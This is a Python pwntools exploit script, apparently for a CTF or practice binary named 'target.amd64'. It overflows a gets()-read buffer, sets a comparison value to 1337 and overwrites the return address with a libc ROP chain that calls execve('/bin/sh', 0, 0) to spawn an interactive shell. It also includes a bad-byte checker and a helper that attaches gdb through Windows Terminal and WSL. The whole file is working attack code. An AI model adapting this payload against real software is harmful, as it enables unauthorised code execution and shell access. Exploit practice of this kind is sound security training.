from pwn import *

file_breakpoints = "breaks64.gdb"
file_binary = "target.amd64"
context.binary = elf = ELF(f"./{file_binary}")
libc = elf.libc


def run_locally(debug = True):
    p = process([elf.path])
    pid = util.proc.pidof(p)[0]
    if debug == True:
        gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
        log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
        cmd = f"cmd.exe /c start {new_tab} {wsl}"
        os.system(cmd)
        util.proc.wait_for_debugger(pid)
    return p


def find_bad_bytes(buf, bad_bytes = None):
    if bad_bytes is None:
        bad_bytes = [
            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
        ]
    found = False
    for i, byte in enumerate(buf):
        if byte in bad_bytes:
            log.warn(f"Bad byte '{hex(byte)}' at {i}")
            found = True
    if found:
        print(hexdump(buf, highlight = bad_bytes))
        log.error("Found bad bytes in a buffer!")


def main():
    libc.address = 0x7ffff7d8d000
    rop = ROP(libc)

    # GADGETS
    pop_rdi = rop.rdi
    pop_rsi = rop.rsi
    pop_rdx_rbx = rop.rdx
    execve = libc.sym["execve"]
    binsh = next(libc.search(b"/bin/sh"))

    # ROP CHAIN
    # execve("/bin/sh", 0, 0)
    rop.raw(pop_rdi)
    rop.raw(binsh)
    rop.raw(pop_rsi)
    rop.raw(0)
    rop.raw(pop_rdx_rbx)
    rop.raw(0)
    rop.raw(0)
    rop.raw(execve)

    # Buffer overflow
    buf = b"A" * 8  # rax before "cmp eax, 0x539"
    buf += p64(1337)
    buf = buf.ljust(48, b"B")  # rsp before "ret"
    buf += bytes(rop)

    # RUN PROCESS
    find_bad_bytes(buf)
    # buf = cyclic(200)
    p = run_locally(debug = False)
    log.info("=== ROP CHAIN")
    print(rop.dump())
    log.info("=== BUFFER")
    print(hexdump(buf))
    p.writeline(buf)
    p.interactive()


if __name__ == "__main__":
    main()
